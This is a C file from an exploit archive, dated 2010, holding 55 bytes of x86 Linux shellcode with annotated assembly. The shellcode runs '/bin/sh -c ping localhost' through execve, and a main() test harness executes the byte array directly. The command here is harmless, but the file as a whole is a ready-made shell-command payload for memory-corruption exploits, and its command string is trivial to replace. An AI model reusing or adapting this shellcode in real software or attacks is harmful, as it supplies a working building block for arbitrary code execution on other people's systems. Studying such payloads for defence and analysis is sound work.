/*
Name   : 55 bytes sys_execve("/bin/sh", "-c", "ping localhost") x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char asshole[] = "\x6a\x0b"             // push   $0xb
		"\x58"                  // pop    %eax
		"\x99"                  // cltd
		"\x52"                  // push   %edx
		"\x68\x73\x74\x20\x20"  // push   $0x20207473
		"\x68\x61\x6c\x68\x6f"  // push   $0x6f686c61
		"\x68\x20\x6c\x6f\x63"  // push   $0x636f6c20
		"\x68\x70\x69\x6e\x67"  // push   $0x676e6970
		"\x89\xe6"              // mov    %esp,%esi
		"\x52"                  // push   %edx
		"\x66\x68\x2d\x63"      // pushw  $0x632d
		"\x89\xe1"              // mov    %esp,%ecx
		"\x52"                  // push   %edx
		"\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
		"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
		"\x89\xe3"              // mov    %esp,%ebx
		"\x52"                  // push   %edx
		"\x56"                  // push   %esi
		"\x51"                  // push   %ecx
		"\x53"                  // push   %ebx
		"\x89\xe1"              // mov    %esp,%ecx
		"\xcd\x80";             // int    $0x80

int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) asshole;
  (int)(*func)();
}